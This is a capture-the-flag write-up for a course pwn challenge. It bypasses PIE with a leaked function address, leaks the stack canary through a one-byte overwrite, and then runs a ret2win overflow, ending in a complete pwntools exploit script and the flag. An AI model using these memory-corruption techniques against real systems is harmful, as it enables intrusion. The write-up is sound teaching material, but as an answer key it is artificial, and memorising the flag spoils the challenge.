Static offsets (constant across runs):
  vuln  = base + 0x11d5
  win   = base + 0x1189       (win - vuln = -0x4c)
  ret   = base + 0x101a       (a bare `ret`, for 16-byte alignment)

buf is at rbp-0x50 and the canary at rbp-0x8, so buf is 0x50 - 0x08 = 0x48 = 72 bytes, exactly reaching the canary.

The program prints, in order (both "> " prompts have no trailing newline; the address varies per run):

```
=== COMP6447 :: Pie in the Sky ===
vuln() lives at 0x55e3a8c491d5
Say something:
> echo: <your 73 bytes><7 canary bytes>
>
```

Solution:
PIE randomises the load address, but the byte distances between functions in the image are fixed. The banner leaks the runtime address of vuln(), so:

base = leaked_vuln - 0x11d5
win  = base + 0x1189
ret  = base + 0x101a

Next, defeat the canary the same way as Canary Cafe. buf[64] sits at rbp-0x50 and the canary at rbp-0x8, i.e. 0x48 = 72 bytes above buf (note buf is declared [64] but there are 8 bytes of frame padding, so the real distance to the canary is 72 - this is why you read the disassembly rather than trusting the array size). The first read() takes 73 bytes: 72 to fill up to the canary and 1 more to paint over its 0x00 LSB, so printf("%s") leaks canary bytes 1..7. Rebuild it as u64(b"\x00" + leak).

Finally overflow: 72 bytes of padding, the recovered canary, 8 bytes for saved RBP, the alignment ret gadget, then win(). win() XORs enc[] with 0x6b to produce FLAG{pie_is_1_leak_plus_1_0ffset} and puts() it.

Full exploit:

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

io = remote('6447.lol', 1341)

# --- leak 1: PIE base ---
io.recvuntil(b'vuln() lives at ')
vuln_rt = int(io.recvline().strip(), 16)
base = vuln_rt - 0x11d5
win  = base + 0x1189
ret  = base + 0x101a
log.info('PIE base = %#x', base)

# --- leak 2: stack canary ---
io.recvuntil(b'> ')
io.send(b'A' * 73)                 # 72 fill + 1 byte over canary LSB
io.recvuntil(b'A' * 73)
canary = u64(b'\x00' + io.recv(7))
log.info('canary = %#018x', canary)

# --- overflow: ret2win ---
payload  = b'A' * 72
payload += p64(canary)
payload += b'B' * 8                # saved rbp
payload += p64(ret)                # alignment
payload += p64(win)

io.recvuntil(b'> ')
io.send(payload)
print(io.recvline_contains(b'FLAG').decode())   # -> FLAG{pie_is_1_leak_plus_1_0ffset}
io.close()
```

Flag: FLAG{pie_is_1_leak_plus_1_0ffset}
